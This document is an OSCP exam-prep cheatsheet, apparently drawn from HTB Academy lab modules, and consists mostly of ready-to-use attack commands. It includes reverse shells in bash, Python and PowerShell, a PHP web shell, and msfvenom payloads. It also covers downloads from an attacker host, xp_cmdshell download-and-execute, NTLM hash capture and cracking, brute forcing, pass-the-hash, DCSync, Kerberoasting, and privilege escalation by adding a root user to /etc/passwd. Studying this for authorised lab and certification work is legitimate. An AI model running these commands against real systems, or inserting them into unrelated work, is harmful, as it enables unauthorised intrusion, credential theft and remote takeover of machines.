# OSCP Cheatsheet

> Built from HTB Academy modules — March 2026

---

## 🗺️ Penetration Testing Process

### Stages
```
1. Pre-Engagement     → scope, rules of engagement, contracts
2. Information Gathering → OSINT, enumeration
3. Vulnerability Assessment → identify weaknesses
4. Exploitation       → gain access
5. Post-Exploitation  → pillage, persistence, lateral movement
6. Lateral Movement   → pivot to other systems
7. Proof-of-Concept   → document findings
8. Reporting          → deliverable to client
```

### Note-Taking Per Machine
```
- Target IP, OS, open ports
- Credentials found
- Attack path taken
- Flags captured
- Screenshots of every step
```

---

## 🔍 Nmap

### Full Scan (always start here)
```bash
nmap -Pn -sV -sC -p- --min-rate 5000 -oA scan <IP>
```

### Quick Top 1000 Ports
```bash
nmap -Pn -sV -sC --min-rate 5000 -oA quick_scan <IP>
```

### UDP Scan
```bash
nmap -Pn -sU --top-ports 100 <IP>
```

### Vulnerability Scripts
```bash
nmap -Pn --script vuln <IP>
```

### OS Detection
```bash
nmap -Pn -O <IP>
```

### Flag Reference
| Flag | Meaning |
|------|---------|
| -Pn | Skip ping, assume host is up |
| -sV | Service version detection |
| -sC | Run default scripts |
| -p- | Scan all 65535 ports |
| --min-rate 5000 | Send 5000 packets/sec minimum |
| -oA | Save output in all formats |
| -sU | UDP scan |
| -O | OS detection |

---

## 🦶 Footprinting

### FTP (Port 21)
```bash
ftp <IP>                          # connect
# username: anonymous             # always test this first
# password: anything

nmap -Pn --script ftp-anon <IP>   # check anonymous login via nmap
```

### SSH (Port 22)
```bash
ssh user@<IP>
ssh user@<IP> -i id_rsa           # with private key
ssh user@<IP> -p 2222             # custom port
```

### SMB (Port 445)
```bash
smbclient -L //<IP>/              # list shares
smbclient //<IP>/share -N         # connect anonymously
enum4linux -a <IP>                # full SMB enumeration
crackmapexec smb <IP>             # quick SMB info
crackmapexec smb <IP> -u '' -p '' --shares   # null session
```

### LDAP (Port 389)
```bash
ldapsearch -H ldap://<IP> -x -b "DC=domain,DC=com"
```

### MSSQL (Port 1433)
```bash
impacket-mssqlclient domain/user:'pass'@<IP>
impacket-mssqlclient domain/user:'pass'@<IP> -windows-auth
```

### MySQL (Port 3306)
```bash
mysql -u root -p -h <IP>
mysql -u root --password='' -h <IP>
```

### RDP (Port 3389)
```bash
xfreerdp /u:user /p:pass /v:<IP>
xfreerdp /u:user /p:pass /v:<IP> /cert-ignore
```

### WinRM (Port 5985)
```bash
evil-winrm -i <IP> -u user -p 'password'
evil-winrm -i <IP> -u user -H <NTLM_HASH>
```

---

## 🐚 Shells & Payloads

### Reverse Shell Listeners
```bash
nc -lvnp 4444                     # netcat listener
rlwrap nc -lvnp 4444              # with arrow keys support
```

### Bash Reverse Shell
```bash
bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'
```

### Python Reverse Shell
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PowerShell Reverse Shell
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Upgrade Shell to TTY
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### Web Shells
```php
<?php system($_GET['cmd']); ?>     # PHP web shell
# Usage: http://site.com/shell.php?cmd=whoami
```

### msfvenom Payloads
```bash
# Windows reverse shell exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe

# Linux reverse shell elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf

# PHP reverse shell
msfvenom -p php/reverse_php LHOST=<IP> LPORT=4444 -f raw -o shell.php

# ASP reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f asp -o shell.asp
```

---

## 📁 File Transfers

### Linux → Target
```bash
# Python HTTP server (on attacker)
python3 -m http.server 8080

# Download on target (Linux)
wget http://<ATTACKER_IP>:8080/file.sh
curl http://<ATTACKER_IP>:8080/file.sh -o file.sh

# Download on target (Windows PowerShell)
wget http://<ATTACKER_IP>:8080/file.exe -O file.exe
Invoke-WebRequest http://<ATTACKER_IP>:8080/file.exe -OutFile file.exe
(New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>:8080/file.exe','file.exe')
```

### SMB Server (for Windows targets)
```bash
# Start SMB server on attacker
impacket-smbserver share . -smb2support

# Download on target (Windows)
copy \\<ATTACKER_IP>\share\file.exe .
```

### SCP
```bash
# Requires SSH credentials on the remote host
scp linenum.sh user@<TARGET_IP>:/tmp/linenum.sh
```
Specify the local file first, then the remote destination after the colon.

### Base64 Transfer
Useful when firewall rules or other restrictions block a direct file transfer. Encode the file on the attacker box, paste the string on the target, then decode it there.

```bash
# Encode on attacker
base64 -w 0 file.exe

# Decode on target (Linux)
echo "BASE64STRING" | base64 -d > file.exe

# Decode on target (Windows)
[System.Convert]::FromBase64String("BASE64STRING") | Set-Content file.exe -Encoding Byte
```

### Validating File Transfers
After transferring a file, confirm it arrived intact.

```bash
# Confirm file type/format
file shell

# Compare hashes on attacker and target
md5sum shell
```
Run `md5sum` on both the local copy and the transferred copy. Matching hashes confirm the transfer, especially after base64 encode/decode, did not corrupt the file.

For a deeper dive, see HTB Academy's File Transfers module.

---

## 🔑 Password Attacks

### Hashcat
```bash
# NTLMv2 (Responder hashes)
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# MD5
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# SHA1
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt

# NTLM
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt

# bcrypt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### John the Ripper
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --show
```

### Identify Hash Type
```bash
hashid hash.txt
hash-identifier
```

### Hydra (Brute Force)
```bash
# SSH
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://<IP>

# FTP
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://<IP>

# HTTP POST login
hydra -l admin -P rockyou.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# RDP
hydra -l user -P rockyou.txt rdp://<IP>

# SMB
hydra -l user -P rockyou.txt smb://<IP>
```

### Responder (NTLM Capture)
```bash
sudo responder -I tun0

# Force NTLM auth via MSSQL
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share';

# Crack captured hash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## 🌐 Web Attacks

### Directory Enumeration
```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

### SQL Injection
```bash
# Test payloads (in username/search fields)
'
' OR 1=1--
' OR '1'='1
admin'--
'; WAITFOR DELAY '0:0:5'--    # MSSQL time-based

# sqlmap
sqlmap -u "http://<IP>/login" --data="user=test&pass=test" --method=POST --batch --dbs
sqlmap -u "http://<IP>/login" --data="user=test&pass=test" --cookie="session=xxx" --batch --dbs
sqlmap -u "http://<IP>/page?id=1" --batch --dbs
```

### Local File Inclusion (LFI)
```
http://<IP>/page.php?file=../../../../etc/passwd
http://<IP>/page.php?file=../../../../etc/shadow
http://<IP>/page.php?file=../../../../Windows/System32/drivers/etc/hosts
```

### Server Side Template Injection (SSTI)
```
# Test payload
{{7*7}}           # should return 49 if vulnerable

# RCE via SSTI (Jinja2/Flask)
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
```

### XSS
```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

---

## 🔧 Web Proxies (Burp Suite)

### Setup
```
1. Burp → Proxy → Proxy Settings → 127.0.0.1:8080
2. Firefox → Settings → Network → Manual Proxy → 127.0.0.1:8080
3. Install Burp CA cert for HTTPS
```

### Key Tabs
```
Proxy    → Intercept and modify requests
Repeater → Manually resend/modify requests
Intruder → Automated fuzzing/brute force
Decoder  → Encode/decode data
```

### Workflow
```
1. Intercept ON → browse to target
2. Right-click request → Send to Repeater
3. Modify request in Repeater → Send
4. Analyze response
```

---

## 🪟 Windows Privilege Escalation

### Initial Enumeration
```powershell
whoami
whoami /priv
whoami /groups
net user
net localgroup administrators
systeminfo
hostname
ipconfig /all
```

### Interesting Privileges
```
SeImpersonatePrivilege   → PrintSpoofer, GodPotato, JuicyPotato
SeBackupPrivilege        → Read any file
SeDebugPrivilege         → Inject into processes
SeLoadDriverPrivilege    → Load malicious driver
SeTakeOwnershipPrivilege → Take ownership of any object
```

### SeImpersonatePrivilege Exploit
```powershell
# Upload and run PrintSpoofer
.\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -i -c "powershell -nop -w hidden -e <BASE64>"

# Or GodPotato
.\GodPotato.exe -cmd "cmd /c whoami"
```

### Service Misconfigurations
```powershell
# Check writable services
Get-Service | Where-Object {$_.Status -eq "Running"}
sc qc <service_name>
accesschk.exe /accepteula -uwcqv <username> *

# Unquoted service path
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
```

### Registry Autoruns
```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

### AlwaysInstallElevated
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1, create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

### winPEAS
```powershell
# Upload and run
.\winPEAS.exe
.\winPEAS.exe quiet
```

### Pass the Hash
```bash
evil-winrm -i <IP> -u administrator -H <NTLM_HASH>
impacket-psexec administrator@<IP> -hashes :<NTLM_HASH>
crackmapexec smb <IP> -u administrator -H <NTLM_HASH>
```

---

## 🐧 Linux Privilege Escalation

### Initial Enumeration
```bash
whoami && id
sudo -l
uname -a
cat /etc/passwd
cat /etc/shadow         # if readable
history
env
```

### SUID Binaries
```bash
find / -perm -4000 2>/dev/null
# Check GTFOBins for exploitation
```

### Capabilities
```bash
getcap -r / 2>/dev/null
# Dangerous: cap_setuid, cap_setgid, cap_net_raw

# cap_setuid exploit (Python)
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Sudo Misconfigurations
```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/vim → sudo vim -c ':!/bin/bash'
# (ALL) NOPASSWD: /usr/bin/find → sudo find . -exec /bin/bash \; -quit
# Check GTFOBins for any listed binary
```

### Cron Jobs
```bash
cat /etc/crontab
ls -la /etc/cron*
# Look for writable scripts run by root
```

### Writable /etc/passwd
```bash
# Generate password hash
openssl passwd -1 -salt xyz password123

# Add root user
echo 'hacker:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

### linPEAS
```bash
# Download and run
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linpeas.sh
./linpeas.sh -a    # all checks
```

### Common Exploit CVEs
```
CVE-2021-4034  → PwnKit (pkexec PrivEsc)
CVE-2021-3156  → Sudo Baron Samedit
CVE-2019-14287 → Sudo -1 bypass
DirtyPipe      → CVE-2022-0847
```

---

## 🏢 Active Directory

### Enumeration (from Windows)
```powershell
# Basic AD info
net user /domain
net group /domain
net group "Domain Admins" /domain

# PowerView
Import-Module .\PowerView.ps1
Get-Domain
Get-DomainUser
Get-DomainGroup
Get-DomainComputer
Find-LocalAdminAccess
```

### Enumeration (from Linux)
```bash
# BloodHound data collection
bloodhound-python -u user -p pass -d domain.com -ns <IP> -c all

# LDAP enumeration
ldapsearch -H ldap://<IP> -x -b "DC=domain,DC=com" "(objectClass=user)"

# crackmapexec
crackmapexec smb <IP> -u user -p pass --users
crackmapexec smb <IP> -u user -p pass --groups
crackmapexec smb <IP> -u user -p pass --shares
```

### Kerberoasting
```bash
# From Linux
impacket-GetUserSPNs domain.com/user:pass -dc-ip <IP> -request

# Crack the ticket
hashcat -m 13100 ticket.txt /usr/share/wordlists/rockyou.txt
```

### ASREPRoasting
```bash
impacket-GetNPUsers domain.com/ -usersfile users.txt -dc-ip <IP> -no-pass
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

### Pass the Hash (AD)
```bash
impacket-psexec domain/admin@<IP> -hashes :<NTLM_HASH>
impacket-wmiexec domain/admin@<IP> -hashes :<NTLM_HASH>
evil-winrm -i <IP> -u admin -H <NTLM_HASH>
```

### DCSync Attack
```bash
impacket-secretsdump domain/admin:pass@<IP>
impacket-secretsdump domain/admin@<IP> -hashes :<NTLM_HASH>
```

---

## 🛠️ MSSQL Attacks

### Connect
```bash
impacket-mssqlclient domain/user:'pass'@<IP>
impacket-mssqlclient domain/user:'pass'@<IP> -windows-auth
```

### Enumeration
```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT name FROM master..sysdatabases;
SELECT name FROM sys.server_principals WHERE type_desc = 'SQL_LOGIN';
```

### User Impersonation
```sql
-- Check who can be impersonated
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate user
EXECUTE AS LOGIN = 'appdev';
SELECT SYSTEM_USER;
```

### Enable xp_cmdshell (requires sysadmin)
```sql
ENABLE_XPCMDSHELL
xp_cmdshell whoami
xp_cmdshell "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1')"
```

### Capture NTLMv2 Hash
```bash
# Start Responder
sudo responder -I tun0

# Trigger auth from MSSQL
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share';

# Crack hash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## 📦 Useful One-Liners

### Find flags
```bash
find / -name "user.txt" 2>/dev/null
find / -name "root.txt" 2>/dev/null
```

### Check active connections
```bash
netstat -antp          # Linux
netstat -ano           # Windows
```

### List running processes
```bash
ps aux                 # Linux
tasklist               # Windows
Get-Process            # PowerShell
```

### Check listening ports
```bash
ss -tlnp               # Linux
netstat -ano | findstr LISTENING   # Windows
```

### Extract passwords from files
```bash
grep -ri "password" /var/www/ 2>/dev/null
grep -ri "password" C:\inetpub\ 2>/dev/null
findstr /si password *.txt *.xml *.config   # Windows
```

### Encode/decode base64
```bash
echo "string" | base64
echo "BASE64" | base64 -d
```
